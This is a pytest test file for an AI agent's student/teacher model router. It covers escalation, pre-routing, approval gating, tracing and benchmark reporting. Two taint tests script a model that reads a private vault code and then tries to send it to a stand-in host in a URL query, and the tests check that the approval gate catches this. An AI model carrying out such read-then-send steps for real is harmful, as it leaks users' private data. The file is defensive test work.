"""Router v1 (kestrel/router.py) with scripted student and teacher backends: no Ollama, no Groq.

The agent, the tool registry and the approval gate are the real ones; only the two models are scripted.
"""

import json
import sqlite3
from pathlib import Path
from typing import Any

import pytest

from kestrel import tools as kestrel_tools
from kestrel.agent import Agent
from kestrel.approval import ApprovalGate, Decision, Notice
from kestrel.bench.report import markdown, routing_summary, summarize
from kestrel.bench.runner import ROUTER_STOP, TaskResult, agent_fingerprint, run_suite
from kestrel.bench.stats import extended_passes, quality_ratio, without_extended_passes
from kestrel.bench.tasks import Task
from kestrel.distill.train_format import tools_fingerprint
from kestrel.llm import CallInfo, FallbackLLM, LLMError, Provider, build_llm
from kestrel.router import (
    PRE_ROUTE,
    QUALITY,
    STUDENT_HEALTH,
    RoutedLLM,
    RouterConfig,
    RouterSetupError,
    build_router,
    load_trained_tools,
    summarize_turns,
)
from kestrel.tools import ToolRegistry
from kestrel.tracing import Tracer

# --- Scripted models and a small tool set -------------------------------------------


class Script:
    """A scripted backend: plays queued replies (an LLMError in the queue is raised) and records requests."""

    def __init__(self, name: str, replies: list[Any]):
        self.provider = Provider(name, "", None, f"{name}-model")
        self.model = f"{name}-model"
        self.replies = list(replies)
        self.requests: list[list[dict]] = []
        self.last_call: CallInfo | None = None

    def chat(self, messages: list[dict], tools: list[dict] | None = None, on_text: Any = None) -> dict:
        self.requests.append([dict(m) for m in messages])
        reply = self.replies.pop(0)
        if isinstance(reply, Exception):
            raise reply
        self.last_call = CallInfo(self.provider.name, self.model, input_tokens=10, output_tokens=5)
        if on_text and reply.get("content"):
            on_text(reply["content"])
        return reply

    def list_models(self) -> list[str]:
        return [self.model]


def answer(text: str) -> dict:
    return {"role": "assistant", "content": text}


def call(name: str, args: Any, call_id: str = "c1", content: str = "") -> dict:
    arguments = args if isinstance(args, str) else json.dumps(args)
    return {
        "role": "assistant",
        "content": content,
        "tool_calls": [{"id": call_id, "type": "function", "function": {"name": name, "arguments": arguments}}],
    }


class Approver:
    def __init__(self, decisions: dict[str, Decision] | None = None):
        self.decisions = decisions or {}
        self.reviews: list[tuple[str, dict]] = []
        self.notices: list[Notice | None] = []  # tiers v2: why an escalated card appeared

    def review(
        self, tool_name: str, args: dict, preview: str, *, allow_session: bool = False, notice: Notice | None = None
    ) -> Decision:
        self.reviews.append((tool_name, dict(args)))
        self.notices.append(notice)
        return self.decisions.get(tool_name, Decision("approved"))


class World:
    """A registry with a counting safe tool, a confirm-tier send and a forbidden delete."""

    def __init__(self) -> None:
        self.ran: list[str] = []
        self.sent: list[str] = []
        reg = ToolRegistry()

        @reg.register
        def add(a: int, b: int) -> int:
            """Add two numbers."""
            self.ran.append("add")
            return a + b

        @reg.register(risk="confirm")
        def send(to: str, body: str) -> str:
            """Send a message."""
            self.ran.append("send")
            self.sent.append(to)
            return f"sent to {to}"

        @reg.register(risk="forbidden")
        def wipe(path: str) -> str:
            """Delete a file."""
            self.ran.append("wipe")
            return "wiped"

        self.registry = reg


def make(
    world: World,
    student: list[Any],
    teacher: list[Any],
    *,
    approver: Approver | None = None,
    trained: list[dict] | None = None,
    tracer: Tracer | None = None,
    events: list[dict] | None = None,
    max_steps: int = 8,
    **config: Any,
) -> tuple[Agent, RoutedLLM, Script, Script, Approver]:
    s, t = Script("student", student), Script("teacher", teacher)
    fp = tools_fingerprint(trained if trained is not None else world.registry.schemas())
    router = RoutedLLM(s, t, fp, RouterConfig(**config))
    approver = approver or Approver()
    agent = Agent(
        router,
        tools=world.registry,
        max_steps=max_steps,
        gate=ApprovalGate(approver, log_path=Path("unused-audit.jsonl")),
        tracer=tracer,
        on_event=(events.append if events is not None else None),
    )
    return agent, router, s, t, approver


@pytest.fixture(autouse=True)
def _audit_in_tmp(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)  # the approval gate's audit log lands in tmp


# --- The student answers when it can --------------------------------------------------


def test_the_student_answers_when_nothing_is_wrong() -> None:
    world = World()
    agent, router, s, t, _ = make(world, [call("add", {"a": 2, "b": 3}), answer("5")], [])
    result = agent.run("2+3?")
    assert result.text == "5" and result.stop_reason == "answered"
    assert len(s.requests) == 2 and t.requests == [] and world.ran == ["add"]
    (turn,) = router.take_turns()
    assert (turn.route, turn.student_steps, turn.teacher_steps) == ("student", 2, 0)


# --- Each escalation signal ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("bad", "reason"),
    [
        (call("nope", {}), "invalid_tool_call"),  # unknown tool
        (call("add", {"a": "two", "b": 3}), "invalid_tool_call"),  # arguments the registry rejects
        (call("add", "{not json"), "invalid_tool_call"),  # arguments that aren't JSON
        (answer(""), "empty_reply"),
        (answer("   "), "empty_reply"),
    ],
)
def test_quality_signals_hand_the_step_to_the_teacher(bad: dict, reason: str) -> None:
    world = World()
    agent, router, s, t, _ = make(world, [bad], [call("add", {"a": 2, "b": 3}), answer("5")])
    result = agent.run("2+3?")
    assert result.text == "5" and world.ran == ["add"]  # the teacher's call ran once; the bad one never did
    assert len(s.requests) == 1 and len(t.requests) == 2
    assert bad not in t.requests[0] and bad not in agent.messages  # the malformed reply never enters the transcript
    (turn,) = router.take_turns()
    assert turn.category == QUALITY and turn.reason and turn.reason.startswith(reason)


@pytest.mark.parametrize(
    ("error", "kind"),
    [
        (LLMError("ollama", "connection refused"), "student_error"),
        (LLMError("ollama", "request timed out"), "student_timeout"),
    ],
)
def test_student_health_signals(error: LLMError, kind: str) -> None:
    world = World()
    agent, router, _s, _t, _ = make(world, [error], [answer("from the teacher")])
    assert agent.run("hi").text == "from the teacher"
    (turn,) = router.take_turns()
    assert turn.category == STUDENT_HEALTH and turn.reason and turn.reason.startswith(kind)


def test_max_steps_hands_over_with_a_fresh_budget_and_nothing_reruns() -> None:
    world = World()
    student = [call("add", {"a": 1, "b": i}, f"s{i}") for i in range(2)]
    agent, router, _s, t, _ = make(world, student, [answer("done")], max_steps=2)
    result = agent.run("keep adding")
    assert (result.text, result.stop_reason, result.steps) == ("done", "answered", 3)
    assert world.ran == ["add", "add"]  # the student's two calls ran once each; nothing re-ran
    assert [m.get("tool_call_id") for m in t.requests[0] if m["role"] == "tool"] == ["s0", "s1"]
    (turn,) = router.take_turns()
    assert (turn.category, turn.reason) == (QUALITY, "max_steps")
    assert summarize_turns([turn], [result.steps], 2)["over_max_steps"] is True


def test_the_teachers_budget_is_capped_at_twice_max_steps() -> None:
    world = World()
    loop = [call("add", {"a": 1, "b": 1}, f"x{i}") for i in range(10)]
    agent, router, _s, _t, _ = make(world, loop[:2], loop[2:], max_steps=2)
    result = agent.run("loop")
    assert result.stop_reason == "max_steps" and result.steps == 4
    assert router.escalate("max_steps") is False  # already the teacher's turn


# --- Pre-route rules ------------------------------------------------------------------------


def test_a_tool_the_student_never_saw_sends_the_turn_to_the_teacher() -> None:
    world = World()
    trained = [s for s in world.registry.schemas() if s["function"]["name"] != "send"]  # e.g. an MCP tool (#76)
    agent, router, s, _t, _ = make(world, [], [answer("teacher")], trained=trained)
    assert agent.run("hi").text == "teacher" and s.requests == []
    (turn,) = router.take_turns()
    assert turn.category == PRE_ROUTE and turn.reason and turn.reason.startswith("tool_set: send: sent at serve time")


def test_a_changed_tool_description_also_pre_routes() -> None:
    world = World()
    trained = json.loads(json.dumps(world.registry.schemas()))
    trained[0]["function"]["description"] += " (old wording)"
    agent, router, _s, _t, _ = make(world, [], [answer("teacher")], trained=trained)
    agent.run("hi")
    assert router.take_turns()[0].reason == "tool_set: add: schema differs (description, parameters or type)"


def test_context_rule_uses_the_margin() -> None:
    from kestrel.agent import SYSTEM_PROMPT, estimate_tokens

    world = World()
    long = "word " * 400
    messages = [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": long}]
    estimate = estimate_tokens(messages) + len(json.dumps(world.registry.schemas())) // 4
    ctx = int(estimate / 0.9)  # the prompt is at ~90% of the student's context: over 80%, under 100%
    agent, router, s, _t, _ = make(world, [], [answer("teacher")], student_ctx=ctx, ctx_margin=0.8)
    assert agent.run(long).text == "teacher" and s.requests == []
    (turn,) = router.take_turns()
    assert turn.category == PRE_ROUTE and turn.reason == f"context: ~{estimate} tokens > 80% of {ctx}"
    agent, _router, _s, _t, _ = make(world, [answer("student")], [], student_ctx=ctx, ctx_margin=1.0)
    assert agent.run(long).text == "student"  # the same prompt fits without the margin: the margin decides


# --- No escalation on refusals or rejected approvals -------------------------------------------


def test_a_refusal_stays_with_the_student() -> None:
    world = World()
    agent, router, _s, t, _ = make(world, [answer("I can't help with that.")], [])
    assert agent.run("do something bad").text == "I can't help with that." and t.requests == []
    assert router.take_turns()[0].route == "student"


def test_a_rejected_approval_never_escalates() -> None:
    world = World()
    approver = Approver({"send": Decision("rejected", reason="Not now.")})
    agent, router, _s, t, _ = make(
        world, [call("send", {"to": "sam", "body": "hi"}), answer("OK, not sent.")], [], approver=approver
    )
    assert agent.run("send it").text == "OK, not sent."
    assert t.requests == [] and world.sent == [] and len(approver.reviews) == 1
    assert router.take_turns()[0].route == "student"


# --- Nothing runs twice -----------------------------------------------------------------------------


def test_an_approved_action_is_history_for_the_teacher_and_never_repeats() -> None:
    world = World()
    student = [call("send", {"to": "sam", "body": "hi"}, "s1"), call("nope", {}, "bad")]
    agent, _router, _s, t, approver = make(world, student, [answer("Sent to Sam.")])
    assert agent.run("email sam").text == "Sent to Sam."
    assert world.sent == ["sam"] and len(approver.reviews) == 1  # one send, one card
    handed = t.requests[0]
    assert any(m.get("tool_call_id") == "s1" and m["content"] == "sent to sam" for m in handed)
    assert not any("bad" in json.dumps(m) for m in handed)


def test_the_next_turn_starts_with_the_student_again() -> None:
    world = World()
    agent, router, _s, _t, _ = make(world, [answer(""), answer("student again")], [answer("teacher")])
    assert agent.run("one").text == "teacher"
    assert agent.run("two").text == "student again"
    assert [turn.route for turn in router.take_turns()] == ["teacher", "student"]


# --- The gate applies to whichever model answers -----------------------------------------------------


def test_the_gate_applies_to_the_teachers_calls() -> None:
    world = World()
    trained = [s for s in world.registry.schemas() if s["function"]["name"] != "add"]  # pre-route to the teacher
    teacher = [call("send", {"to": "sam", "body": "hi"}, "t1"), call("wipe", {"path": "x"}, "t2"), answer("done")]
    agent, _router, _s, _t, approver = make(world, [], teacher, trained=trained)
    agent.run("send then wipe")
    assert approver.reviews == [("send", {"to": "sam", "body": "hi"})]  # a card for the confirm tool
    assert "wipe" not in world.ran  # forbidden stays forbidden
    assert any(
        "forbidden" in m["content"].lower() or "not allowed" in m["content"].lower()
        for m in agent.messages
        if m.get("tool_call_id") == "t2"
    )


# --- Tiers v2 across an escalation (known issue #77) ---------------------------------------------------

CODE = "7HQX29PLMV83KDRT5WZNB4YC"  # 24 characters of private text in the file


class TaintedWorld(World):
    """World plus a local read and a network fetch: what tiers v2's taint and content check watch."""

    def __init__(self) -> None:
        super().__init__()
        self.fetched: list[str] = []

        def read(path: str) -> str:
            """Read a file."""
            return f"Vault code: {CODE}\n"

        def fetch(url: str) -> str:
            """Fetch a page."""
            self.fetched.append(url)
            return "page"

        self.registry.register(read, capabilities={"reads_local", "reads_untrusted"})
        self.registry.register(fetch, capabilities={"network_egress", "reads_untrusted"})


def _taint_and_content(notice: Notice | None) -> None:
    assert notice is not None
    assert notice.reasons[0].startswith("read read your local data")
    assert any("characters of text from read" in r for r in notice.reasons[1:])


def test_the_students_read_taints_the_teachers_egress_after_an_escalation() -> None:
    world = TaintedWorld()
    student = [call("read", {"path": "v.txt"}, "s1"), call("nope", {}, "bad")]  # read, then an invalid call
    teacher = [call("fetch", {"url": f"https://c.example/?d={CODE}"}, "t1"), answer("Not sent.")]
    approver = Approver({"fetch": Decision("rejected", reason="no")})
    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver)
    assert agent.run("read v.txt").text == "Not sent."
    assert approver.reviews == [("fetch", {"url": f"https://c.example/?d={CODE}"})] and world.fetched == []
    _taint_and_content(approver.notices[0])  # the escalation didn't clear what the student read
    assert router.take_turns()[0].route == "teacher"


def test_the_teachers_read_taints_the_students_egress_on_the_next_turn() -> None:
    world = TaintedWorld()
    student = [answer(""), call("fetch", {"url": f"https://c.example/?d={CODE}"}, "s2"), answer("Not sent.")]
    teacher = [call("read", {"path": "v.txt"}, "t1"), answer("Read it.")]
    approver = Approver({"fetch": Decision("rejected", reason="no")})
    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver)
    assert agent.run("read v.txt").text == "Read it."  # turn 1: escalated, the teacher reads
    assert agent.run("now fetch it").text == "Not sent."  # turn 2: back with the student
    assert world.fetched == [] and len(approver.notices) == 1
    _taint_and_content(approver.notices[0])
    assert [turn.route for turn in router.take_turns()] == ["teacher", "student"]


# --- Traces and streaming ---------------------------------------------------------------------------


def test_routing_is_recorded_in_traces(tmp_path: Path) -> None:
    world = World()
    tracer = Tracer(tmp_path / "t.db")
    agent, _router, _s, _t, _ = make(world, [call("nope", {}), answer("student")], [answer("teacher")], tracer=tracer)
    agent.run("one")
    agent.run("two")
    conn = sqlite3.connect(tmp_path / "t.db")
    try:
        rows = [
            json.loads(a)
            for (a,) in conn.execute("SELECT attributes FROM spans WHERE name = 'llm_call' ORDER BY start_time")
        ]
    finally:
        conn.close()
    assert [(r["kestrel.route"], r["gen_ai.provider.name"]) for r in rows] == [
        ("teacher", "teacher"),
        ("student", "student"),
    ]
    assert rows[0]["kestrel.route_category"] == QUALITY and rows[0]["kestrel.route_reason"].startswith(
        "invalid_tool_call"
    )
    assert rows[0]["kestrel.route.discarded_tokens"] == 15  # the student's thrown-away reply still counts
    assert "kestrel.route.discarded_tokens" not in rows[1]


def test_a_discarded_student_reply_is_never_shown() -> None:
    world = World()
    events: list[dict] = []
    agent, _router, _s, _t, _ = make(
        world, [call("nope", {}, content="Let me use nope")], [answer("teacher text")], events=events
    )
    agent.run("hi")
    shown = "".join(e["text"] for e in events if e["type"] == "text_delta")
    assert "Let me use nope" not in shown and "teacher text" in shown


# --- Setup and the off-by-default path -----------------------------------------------------------------


def test_setup_errors(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    with pytest.raises(RouterSetupError, match="KESTREL_ROUTER_LINEAGE"):
        load_trained_tools(None)
    with pytest.raises(RouterSetupError, match=r"no lineage\.json"):
        load_trained_tools(str(tmp_path / "missing.json"))
    (tmp_path / "old.json").write_text("{}", encoding="utf-8")
    with pytest.raises(RouterSetupError, match="no tool_schemas"):
        load_trained_tools(str(tmp_path / "old.json"))
    with pytest.raises(LLMError, match="can't be combined"):
        build_llm(["routed", "groq"])


def test_build_router_from_the_environment(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    lineage = tmp_path / "lineage.json"
    lineage.write_text(json.dumps({"tool_schemas": tools_fingerprint([])}), encoding="utf-8")
    monkeypatch.setenv("KESTREL_ROUTER_LINEAGE", str(lineage))
    monkeypatch.setenv("KESTREL_ROUTER_CTX_MARGIN", "0.7")
    built: list[tuple[list[str], str | None]] = []

    def fake_build(names: list[str], model: str | None) -> tuple[Script, list[str]]:
        built.append((names, model))
        return Script(names[0], []), []

    router = build_router(None, fake_build)
    assert built == [(["ollama"], None), (["groq"], None)]
    assert router.config.ctx_margin == 0.7 and router.llms == [router] and router.provider.name == "routed"


def test_off_by_default() -> None:
    llm, _ = build_llm(["demo"])
    assert isinstance(llm, FallbackLLM)
    assert not hasattr(llm, "begin_turn") and not hasattr(llm, "escalate")
    assert "router" not in agent_fingerprint("groq", "openai/gpt-oss-120b")
    assert "router" in agent_fingerprint("routed", "a -> b")
    assert "routing" not in TaskResult(id="x", category="c", status="pass", score=1.0).to_dict()


# --- Routed bench runs ---------------------------------------------------------------------------------


def _tasks(n: int) -> list[Task]:
    return [Task(id=f"t{i}", category="no_tools", prompts=("hi",), checks=({"type": "no_tools"},)) for i in range(n)]


def _bench_router(student: list[Any], teacher: list[Any]) -> RoutedLLM:
    fp = tools_fingerprint(kestrel_tools.registry.schemas())  # run_task uses Kestrel's own registry
    return RoutedLLM(Script("student", student), Script("teacher", teacher), fp, RouterConfig())


def test_a_failing_student_stops_a_routed_bench_run() -> None:
    llm = _bench_router([LLMError("ollama", "connection refused")] * 12, [answer("ok")] * 12)
    results = run_suite(_tasks(12), llm, expected_provider="routed", student_health_limit=0.10)
    graded = [r for r in results if r.status == "pass"]
    assert len(graded) == 10  # the guard waits for 10 routed tasks before judging
    stopped = [r for r in results if r.status == "skipped"]
    assert (
        len(stopped) == 2
        and ROUTER_STOP in (stopped[0].error or "")
        and "10 of 10 turns (100%)" in (stopped[0].error or "")
    )
    assert graded[0].routing and graded[0].routing["categories"] == {"student_health": 1}


def test_the_health_threshold_is_a_setting() -> None:
    llm = _bench_router([LLMError("ollama", "connection refused")] * 12, [answer("ok")] * 12)
    results = run_suite(_tasks(12), llm, expected_provider="routed", student_health_limit=1.0)
    assert all(r.status == "pass" for r in results)


def test_routed_reports_show_escalations_and_extended_passes() -> None:
    rows = [
        {
            "id": "a",
            "category": "c",
            "status": "pass",
            "score": 1,
            "tokens": 1,
            "latency_ms": 1,
            "checks": [],
            "routing": {
                "turns": 1,
                "escalated_turns": 0,
                "reasons": {},
                "categories": {},
                "steps_per_turn": [2],
                "over_max_steps": False,
            },
        },
        {
            "id": "b",
            "category": "c",
            "status": "pass",
            "score": 1,
            "tokens": 1,
            "latency_ms": 1,
            "checks": [],
            "routing": {
                "turns": 2,
                "escalated_turns": 1,
                "reasons": {"max_steps": 1},
                "categories": {"quality": 1},
                "steps_per_turn": [9, 1],
                "over_max_steps": True,
            },
        },
        {
            "id": "c",
            "category": "c",
            "status": "fail",
            "score": 0,
            "tokens": 1,
            "latency_ms": 1,
            "checks": [],
            "routing": {
                "turns": 1,
                "escalated_turns": 1,
                "reasons": {"tool_set": 1},
                "categories": {"pre_route": 1},
                "steps_per_turn": [1],
                "over_max_steps": False,
            },
        },
    ]
    r = routing_summary(rows)
    assert r is not None
    assert (r["turns"], r["escalated_turns"], r["task_runs"], r["escalated_task_runs"]) == (4, 2, 3, 2)
    assert r["by_reason"] == {"max_steps": 1, "tool_set": 1} and r["by_category"] == {"pre_route": 1, "quality": 1}
    assert r["passed_only_over_max_steps"] == ["b"]
    assert summarize(rows)["pass_rate"] == pytest.approx(0.667, abs=0.001) and r[
        "pass_rate_without_over_max_steps"
    ] == pytest.approx(0.333, abs=0.001)
    text = markdown({"meta": {}, "tasks": rows})
    assert "**Routing:**" in text and "Passed only past max_steps** (the teacher's fresh budget): 1 (b)" in text
    assert "routing" not in summarize([{k: v for k, v in rows[0].items() if k != "routing"}])


def test_quality_verdict_with_and_without_extended_passes() -> None:
    from kestrel.bench.cli import quality_verdict

    ids = [f"t{i}" for i in range(40)]
    teacher = {"tasks": [{"id": i, "status": "pass"} for i in ids]}
    routed_rows = [{"id": i, "status": "pass", "routing": {"over_max_steps": i in ids[:6]}} for i in ids]
    routed = {"tasks": routed_rows}
    assert extended_passes(routed_rows) == sorted(ids[:6])
    assert sum(r["status"] == "fail" for r in without_extended_passes(routed_rows)) == 6
    ratio = quality_ratio(teacher, routed)
    assert ratio is not None and ratio.value == 1.0
    text = quality_verdict(teacher, routed)
    assert "as measured: 1.000" in text and "HOLDS" in text.splitlines()[0]
    assert "without the 6 passes past max_steps: 0.850" in text and "NOT SHOWN" in text.splitlines()[1]
    assert "the claim must hold without them" in text


def test_a_routed_bench_run_through_the_cli(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    import argparse

    from kestrel.bench import cli as bench_cli

    lineage = tmp_path / "lineage.json"
    lineage.write_text(
        json.dumps({"tool_schemas": tools_fingerprint(kestrel_tools.registry.schemas())}), encoding="utf-8"
    )
    monkeypatch.setenv("KESTREL_ROUTER_LINEAGE", str(lineage))
    router = _bench_router(
        [call("nope", {}), answer("409.5")], [call("calculator", {"expression": "0.175*2340"}), answer("409.5")]
    )
    monkeypatch.setattr(bench_cli, "build_llm", lambda names, model=None: (router, []))
    monkeypatch.setattr(bench_cli, "Tracer", lambda db: Tracer(None))  # nothing touches logs/
    parser = argparse.ArgumentParser()
    bench_cli.add_parser(parser.add_subparsers(dest="command"))
    out = tmp_path / "routed.json"
    args = parser.parse_args(
        ["bench", "run", "--provider", "routed", "--tasks", "arith-percent", "--judge", "none", "--out", str(out)]
    )
    assert bench_cli.main(args) == 0
    data = json.loads(out.read_text(encoding="utf-8"))
    assert "lineage" not in data["meta"]["agent"]["router"]  # no local path in results
    assert (
        data["meta"]["provider"] == "routed"
        and data["meta"]["agent"]["router"]["trained_tools_sha256"]
        == tools_fingerprint(kestrel_tools.registry.schemas())["sha256"]
    )
    (task,) = data["tasks"]
    assert task["status"] == "pass" and task["routing"]["reasons"] == {"invalid_tool_call": 1}
    assert data["summary"]["routing"]["escalated_turns"] == 1
    printed = capsys.readouterr().out
    assert "**Routing:** the teacher answered 1 of 1 turns" in printed
